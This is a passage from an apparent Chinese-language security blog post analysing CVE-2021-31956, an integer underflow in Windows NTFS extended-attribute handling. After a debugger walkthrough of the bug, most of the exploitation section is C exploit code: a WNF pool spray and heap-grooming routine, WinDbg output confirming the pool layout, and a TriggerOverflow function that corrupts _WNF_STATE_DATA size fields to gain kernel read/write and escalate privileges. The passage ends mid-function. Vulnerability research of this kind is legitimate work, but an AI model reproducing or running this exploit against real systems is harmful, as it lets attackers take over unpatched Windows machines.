class="built_in">printf</span>(<span class="string">&quot;NtSetEaFile failed error code is %x\r\n&quot;</span>, rc);</span><br><span class="line">		<span class="keyword">goto</span> ERROR_HANDLE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	eaData = <span class="built_in">malloc</span>(<span class="number">0x12</span>);</span><br><span class="line">	<span class="keyword">if</span> (eaData == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">goto</span> ERROR_HANDLE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(eaData, <span class="number">0</span>, <span class="number">0x12</span>);</span><br><span class="line"></span><br><span class="line">	EaList = (PFILE_GET_EA_INFORMATION)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="keyword">if</span> (EaList == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">goto</span> ERROR_HANDLE;</span><br><span class="line">	&#125;</span><br><span class="line">	EaListCP = EaList;</span><br><span class="line">	<span class="built_in">memset</span>(EaList, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(EaList-&gt;EaName, <span class="string">&quot;.PA&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;.PA&quot;</span>));</span><br><span class="line">	EaList-&gt;EaNameLength = (UCHAR)<span class="built_in">strlen</span>(<span class="string">&quot;.PA&quot;</span>);</span><br><span class="line">	EaList-&gt;NextEntryOffset = <span class="number">12</span>; <span class="comment">// align 4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	EaList = (PFILE_GET_EA_INFORMATION)((PUCHAR)EaList + <span class="number">12</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(EaList-&gt;EaName, <span class="string">&quot;.PBB&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;.PBB&quot;</span>));</span><br><span class="line">	EaList-&gt;EaNameLength = (UCHAR)<span class="built_in">strlen</span>(<span class="string">&quot;.PBB&quot;</span>);</span><br><span class="line">	EaList-&gt;NextEntryOffset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	rc = <span class="built_in">NtQueryEaFile</span>(hFile, &amp;eaStatus, eaData, <span class="number">0x12</span>, FALSE, EaListCP, <span class="number">100</span>, <span class="number">0</span>, TRUE);</span><br></pre></td></tr></table></figure>

<p>首先,申请了0x12大小的分页内存池,内存池实际的大小为0x30.</p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912151147533.png" alt="image-20230912151147533"></p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912151636023.png" alt="image-20230912151636023"></p>
<p>开始第一次获取扩展属性,将OutBuflen-padding的值与ea_block_size比较,进行溢出检查,我们申请的内存池大小为0x12,而我们ea_block_size&#x3D;ea_block_size &#x3D; v20-&gt;EaValueLength + v20-&gt;EaNameLength + 9;也就是0x3+0x6+0x9&#x3D;0x12,也是0x12,因此通过验证,进行copy.</p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912151856702.png" alt="image-20230912151856702"></p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912152049842.png" alt="image-20230912152049842"></p>
<p>copy完之后,开始计算下次需要对齐的字节,也就是padding,0x12进行4字节对齐,需要2个字节进行填充</p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912152446900.png" alt="image-20230912152446900"></p>
<p>然后进入第二轮的扩展属性copy前的判断,此时剩余的OutBuglen长度经过第一次copy,现在为0,此时padding长度为2,相减发生溢出</p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912152602892.png" alt="image-20230912152602892"></p>
<p>由于发生溢出,仍然会通过验证,此次copy将发生越界写入</p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912152743286.png" alt="image-20230912152743286"></p>
<p>在经过copy后,相邻的下个分页内存池已被破坏,由于系统在释放时没有对NtFE内存池进行一些检查,这里不一定会蓝屏,如果相邻的被覆盖内存池存在一些检查,那么有可能蓝屏.</p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912153108070.png" alt="image-20230912153108070"></p>
<h2 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h2><h3 id="1-利用思路"><a href="#1-利用思路" class="headerlink" title="1.利用思路"></a>1.利用思路</h3><p>这个漏洞利用起来还是比较灵活的,因为这个漏洞ExAllocateWithTag申请的内存大小是可控的,方便我们构造堆风水,但是需要注意这是一个分页内存池,我们需要挑选一个在在分页内存池中存储的对象.并且ring3可以创建和访问.</p>
<p>windows的WNF对象是分配在分页内存池中的,并且可以用于构造任意地址读写原语.在之前的文章中有介绍.</p>
<p><a target="_blank" rel="noopener" href="https://ashlq.github.io/2023/08/18/EXP%E7%BC%96%E5%86%99-windows%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8%E5%8E%9F%E8%AF%AD%E6%80%BB%E7%BB%93/">https://ashlq.github.io/2023/08/18/EXP%E7%BC%96%E5%86%99-windows%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8%E5%8E%9F%E8%AF%AD%E6%80%BB%E7%BB%93/</a></p>
<p>_WNF_NAME_INSTANCE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+0x000 Header           : _WNF_NODE_HEADER</span><br><span class="line">+0x008 RunRef           : _EX_RUNDOWN_REF</span><br><span class="line">+0x010 TreeLinks        : _RTL_BALANCED_NODE</span><br><span class="line">+0x028 StateName        : _WNF_STATE_NAME_STRUCT</span><br><span class="line">+0x030 ScopeInstance    : Ptr64 _WNF_SCOPE_INSTANCE</span><br><span class="line">+0x038 StateNameInfo    : _WNF_STATE_NAME_REGISTRATION</span><br><span class="line">+0x050 StateDataLock    : _WNF_LOCK</span><br><span class="line">+0x058 StateData        : Ptr64 _WNF_STATE_DATA</span><br><span class="line">+0x060 CurrentChangeStamp : Uint4B</span><br><span class="line">+0x068 PermanentDataStore : Ptr64 Void</span><br><span class="line">+0x070 StateSubscriptionListLock : _WNF_LOCK</span><br><span class="line">+0x078 StateSubscriptionListHead : _LIST_ENTRY</span><br><span class="line">+0x088 TemporaryNameListEntry : _LIST_ENTRY</span><br><span class="line">+0x098 CreatorProcess   : Ptr64 Void</span><br><span class="line">+0x0a0 DataSubscribersCount : Int4B</span><br><span class="line">+0x0a4 CurrentDeliveryCount : Int4B</span><br></pre></td></tr></table></figure>

<p>_WNF_STATE_DATA,实际的数据存储在此结构后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+0x000 Header           : _WNF_NODE_HEADER</span><br><span class="line">+0x004 AllocatedSize    : Uint4B</span><br><span class="line">+0x008 DataSize         : Uint4B</span><br><span class="line">+0x00c ChangeStamp      : Uint4B</span><br></pre></td></tr></table></figure>

<p>_WNF_NAME_INSTANCE小于0x200,_WNF_STATE_DATA结构大小可控,都是由LFH低碎片堆进行分配.</p>
<p>_WNF_NAME_INSTANCE大小为0xb8,再加上0x10字节的_POOL_HEADER,为0xd8,最终会分配在0xc0大小的内存池中.</p>
<p>Vulnerable chunk申请的大小为0xa1-0xaf都会在0xc0大小的内存池中.</p>
<table>
<thead>
<tr>
<th>Vulnerable chunk(NtFE)</th>
<th>Overwrite chunk1(_WNF_STATE_DATA)</th>
<th>Overwrite chunk2(_WNF_NAME_INSTANCE)</th>
</tr>
</thead>
</table>
<p>将vulnerable chunk下一相邻池布局为_WNF_STATE_DATA的目的是为了通过漏洞将其结构中DataSize进行篡改,</p>
<p>可以将数据的范围扩大.然后通过NtQueryWnfStateData&#x2F;NtUpDateWnfStateData就可以实现相对的任意地址读写,利用此读写修改掉第三个块中_WNF_NAME_INSTANCE中StateData指针,换成一个伪造的_WNF_STATE_DATA,就可以实现利用.</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>第一步是对内存池进行布局,这里_WNF_STATE_DATA和_WNF_NAME_INSTANCE的内存池大小均为0xC0.为了确保堆的布局如上的结构,确保我们第二个chunk为_WNF_STATE_DATA,需要一些验证.这是对内存池进行布局的代码</p>
<p>首先创建了大量的_WNF_NAME_INSTANCE对象进行内存占位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//	SPRAY_COUNT=20000</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; SPRAY_COUNT; i++)</span><br><span class="line">	&#123;</span><br><span class="line">	Status = NtCreateWnfStateName(&amp;StateNamesList1[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, <span class="literal">NULL</span>, <span class="number">0x1000</span>, pSecurityDescriptor);</span><br><span class="line">	<span class="keyword">if</span> (Status != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (pSecurityDescriptor)</span><br><span class="line">		&#123;</span><br><span class="line">			LocalFree(pSecurityDescriptor);</span><br><span class="line">			pSecurityDescriptor = nullptr;</span><br><span class="line">		&#125;</span><br><span class="line">		Ulog(<span class="string">&quot;Could not create WNF state name at index (%lld) with error (%lx).&quot;</span>, i, Status);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而后从索引1开始每隔2个开始释放,造成内存空洞.</p>
<p>此时理想的内存布局如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_WNF_NAME_INSTANCE|FREE|_WNF_NAME_INSTANCE|FREE|_WNF_NAME_INSTANCE|FREE|_WNF_NAME_INSTANCE|FREE|_WNF_NAME_INSTANCE|FREE</span><br></pre></td></tr></table></figure>

<p>而后通过调用NtUpdateWnfStateData创建未被释放的_WNF_NAME_INSTANCE的_WNF_STATE_DATA对象,创建的_WNF_STATE_DATA对象会在上一步释放造成的内存空洞中.</p>
<p>此时理想的内存布局如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_WNF_NAME_INSTANCE|_WNF_STATE_DATA|_WNF_NAME_INSTANCE|_WNF_STATE_DATA|_WNF_NAME_INSTANCE|_WNF_STATE_DATA|_WNF_NAME_INSTANCE|_WNF_STATE_DATA|_WNF_NAME_INSTANCE|_WNF_STATE_DATA</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">BYTE Buffer[<span class="number">0xa0</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">1</span>; i &lt; SPRAY_COUNT; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">	Status = NtDeleteWnfStateName(&amp;StateNamesList1[i]);</span><br><span class="line">	<span class="keyword">if</span> (Status != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (pSecurityDescriptor)</span><br><span class="line">		&#123;</span><br><span class="line">			LocalFree(pSecurityDescriptor);</span><br><span class="line">			pSecurityDescriptor = nullptr;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	StateNamesList1[i].Data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	StateNamesList1[i].Data[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	Status = NtUpdateWnfStateData((PWNF_STATE_NAME)&amp;StateNamesList1[i - <span class="number">1</span>], &amp;Buffer, <span class="number">0xa0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (Status != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (pSecurityDescriptor)</span><br><span class="line">		&#123;</span><br><span class="line">			LocalFree(pSecurityDescriptor);</span><br><span class="line">			pSecurityDescriptor = nullptr;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来,开始释放一部分_WNF_NAME_INSTANCE对象,再次造成内存空洞.这里要注意的是,需要释放掉StateData,再删除nameinstance对象.</p>
<p>当这一步执行完后,有很大概率会构成这样一个理想的内存布局,让Vulnerable chunk分配在释放的池中,可以进行漏洞利用.当然,这不是一定会成功的,因为释放掉了一些StateData,成功率会低一点,可以通过一些函数访问nameinstance或者StateData对象去验证自己的布局是否是理想的.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FREE|_WNF_STATE_DATA|_WNF_NAME_INSTANCE|_WNF_STATE_DATA|FREE|_WNF_STATE_DATA|_WNF_NAME_INSTANCE|_WNF_STATE_DATA|FREE|_WNF_STATE_DATA</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; SPRAY_COUNT; i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	NtDeleteWnfStateData(&amp;StateNamesList1[i], <span class="literal">NULL</span>);</span><br><span class="line">	NtDeleteWnfStateName(&amp;StateNamesList1[i]);</span><br><span class="line"></span><br><span class="line">	StateNamesList1[i].Data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	StateNamesList1[i].Data[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行后如下,已经成功的进行了布局,NtFE相邻的第一个池和第二个池分别是_WNF_STATE_DATA和_WNF_NAME_INSTANCE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Ntfs!NtfsCommonQueryEa+0x2a1:</span><br><span class="line">fffff800`12bddf01 488bf0          mov     rsi,rax</span><br><span class="line">0: kd&gt; !pool rax</span><br><span class="line">Pool page ffffdf8990d846e0 region is Paged pool</span><br><span class="line"> ffffdf8990d84000 size:  190 previous size:    0  (Free)       ....</span><br><span class="line"> ffffdf8990d84190 size:   c0 previous size:    0  (Free)       Wnf </span><br><span class="line"> ffffdf8990d84250 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffffb90f97691080</span><br><span class="line"> ffffdf8990d84310 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffffb90f97691080</span><br><span class="line"> ffffdf8990d843d0 size:   c0 previous size:    0  (Free)       Wnf </span><br><span class="line"> ffffdf8990d84490 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffffb90f97691080</span><br><span class="line"> ffffdf8990d84550 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffffb90f97691080</span><br><span class="line"> ffffdf8990d84610 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffffb90f97691080</span><br><span class="line">*ffffdf8990d846d0 size:   c0 previous size:    0  (Allocated) *NtFE</span><br><span class="line">		Pooltag NtFE : Ea.c, Binary : ntfs.sys</span><br><span class="line"> ffffdf8990d84790 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffffb90f97691080</span><br><span class="line"> ffffdf8990d84850 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffffb90f97691080</span><br><span class="line"> ffffdf8990d84910 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffffb90f97691080</span><br><span class="line"> ffffdf8990d849d0 size:   c0 previous size:    0  (Free)       Wnf </span><br><span class="line"> ffffdf8990d84a90 size:   c0 previous size:    0  (Free)       Wnf </span><br><span class="line"> ffffdf8990d84b50 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffffb90f97691080</span><br><span class="line"> ffffdf8990d84c10 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffffb90f97691080</span><br><span class="line"> ffffdf8990d84cd0 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffffb90f97691080</span><br><span class="line"> ffffdf8990d84d90 size:   c0 previous size:    0  (Free)       Wnf </span><br><span class="line"> ffffdf8990d84e50 size:   c0 previous size:    0  (Free)       Wnf </span><br><span class="line"> ffffdf8990d84f10 size:   c0 previous size:    0  (Free)       Wnf </span><br><span class="line">0: kd&gt; dt _WNF_STATE_DATA ffffdf8990d84790+0x10</span><br><span class="line">nt!_WNF_STATE_DATA</span><br><span class="line">   +0x000 Header           : _WNF_NODE_HEADER</span><br><span class="line">   +0x004 AllocatedSize    : 0xa0</span><br><span class="line">   +0x008 DataSize         : 0xa0</span><br><span class="line">   +0x00c ChangeStamp      : 1</span><br><span class="line">0: kd&gt; dt _WNF_NAME_INSTANCE ffffdf8990d84850+0x10</span><br><span class="line">nt!_WNF_NAME_INSTANCE</span><br><span class="line">   +0x000 Header           : _WNF_NODE_HEADER</span><br><span class="line">   +0x008 RunRef           : _EX_RUNDOWN_REF</span><br><span class="line">   +0x010 TreeLinks        : _RTL_BALANCED_NODE</span><br><span class="line">   +0x028 StateName        : _WNF_STATE_NAME_STRUCT</span><br><span class="line">   +0x030 ScopeInstance    : 0xffffdf89`8dd39710 _WNF_SCOPE_INSTANCE</span><br><span class="line">   +0x038 StateNameInfo    : _WNF_STATE_NAME_REGISTRATION</span><br><span class="line">   +0x050 StateDataLock    : _WNF_LOCK</span><br><span class="line">   +0x058 StateData        : 0xffffdf89`90d619e0 _WNF_STATE_DATA</span><br><span class="line">   +0x060 CurrentChangeStamp : 1</span><br><span class="line">   +0x068 PermanentDataStore : (null) </span><br><span class="line">   +0x070 StateSubscriptionListLock : _WNF_LOCK</span><br><span class="line">   +0x078 StateSubscriptionListHead : _LIST_ENTRY [ 0xffffdf89`90d848d8 - 0xffffdf89`90d848d8 ]</span><br><span class="line">   +0x088 TemporaryNameListEntry : _LIST_ENTRY [ 0xffffdf89`90d85de8 - 0xffffdf89`90d84528 ]</span><br><span class="line">   +0x098 CreatorProcess   : 0xffffb90f`97691080 _EPROCESS</span><br><span class="line">   +0x0a0 DataSubscribersCount : 0n0</span><br><span class="line">   +0x0a4 CurrentDeliveryCount : 0n0</span><br></pre></td></tr></table></figure>

<p>下一步,开始触发漏洞.对Overwrite chunk1(_WNF_STATE_DATA)的AllocatedSize和DataSize进行覆盖. 然后通过NtQueryWnfStateData&#x2F;NtUpDateWnfStateData函数利用Overwrite chunk1(_WNF_STATE_DATA)中对象进行相对任意地址读写,伪造Overwrite chunk2(_WNF_NAME_INSTANCE)中StateData.就可以借助伪造的_WNF_STATE_DATA对象进行任意地址读写,完成提权了.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">TriggerOverflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hFile = CreateFileA(<span class="string">&quot;TriggerBug&quot;</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		CREATE_ALWAYS,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!hFile || hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		Ulog(<span class="string">&quot;Could not create file with error (%lx).&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD dwNumbersOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!WriteFile(hFile, <span class="string">&quot;fs0x30&quot;</span>, <span class="number">6</span>, &amp;dwNumbersOfBytesWritten, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		Ulog(<span class="string">&quot;Could not write to file with error (%lx).&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	UCHAR Buffer[<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	PFILE_FULL_EA_INFORMATION pEAInformations = reinterpret_cast&lt;PFILE_FULL_EA_INFORMATION&gt;(Buffer);</span><br><span class="line"></span><br><span class="line">	pEAInformations-&gt;Flags = <span class="number">0</span>;</span><br><span class="line">	pEAInformations-&gt;EaNameLength = TRIGGER_EA_NAME_LENGTH;  </span><br><span class="line">	pEAInformations-&gt;EaValueLength = TRIGGER_EA_VALUE_LENGTH; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	RtlCopyMemory(pEAInformations-&gt;EaName, TRIGGER_EA_NAME, TRIGGER_EA_NAME_LENGTH);</span><br><span class="line"></span><br><span class="line">	pEAInformations-&gt;NextEntryOffset = (pEAInformations-&gt;EaNameLength + pEAInformations-&gt;EaValueLength + <span class="number">3</span> + <span class="number">9</span>) &amp; (~<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	PFILE_FULL_EA_INFORMATION pSecondEAInformation_Overflow = reinterpret_cast&lt;PFILE_FULL_EA_INFORMATION&gt;(Buffer + pEAInformations-&gt;NextEntryOffset);</span><br><span class="line">	pSecondEAInformation_Overflow-&gt;NextEntryOffset = <span class="number">0</span>;</span><br><span class="line">	pSecondEAInformation_Overflow-&gt;Flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	pSecondEAInformation_Overflow-&gt;EaNameLength = OVERFLOW_EA_NAME_LENGTH;</span><br><span class="line">	pSecondEAInformation_Overflow-&gt;EaValueLength = OVERFLOW_EA_VALUE_LENGTH;</span><br><span class="line"></span><br><span class="line">	RtlCopyMemory(pSecondEAInformation_Overflow-&gt;EaName, OVERFLOW_EA_NAME, OVERFLOW_EA_NAME_LENGTH);</span><br><span class="line"></span><br><span class="line">	_WNF_STATE_DATA* pWNFStateData = reinterpret_cast&lt;_WNF_STATE_DATA*&gt;(reinterpret_cast&lt;UCHAR*&gt;(pSecondEAInformation_Overflow) + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	pWNFStateData-&gt;AllocatedSize = OVERFLOWN_STATEDATA_LENGTH;</span><br><span class="line"></span><br><span class="line">	pWNFStateData-&gt;DataSize = OVERFLOWN_STATEDATA_LENGTH;</span><br><span class="line"></span><br><span class="line">	IO_STATUS_BLOCK EaStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	NTSTATUS Status = NtSetEaFile(hFile, &amp;EaStatusBlock, Buffer, <span class="keyword">sizeof</span> Buffer);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Status != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Ulog(<span class="string">&quot;Could not set EA file with error (%lx).&quot;</span>, Status);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	UCHAR OutBuffer[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PFILE_GET_EA_INFORMATION pEaListRequest = reinterpret_cast&lt;PFILE_GET_EA_INFORMATION&gt;(new BYTE[<span class="number">100</span>]());</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> 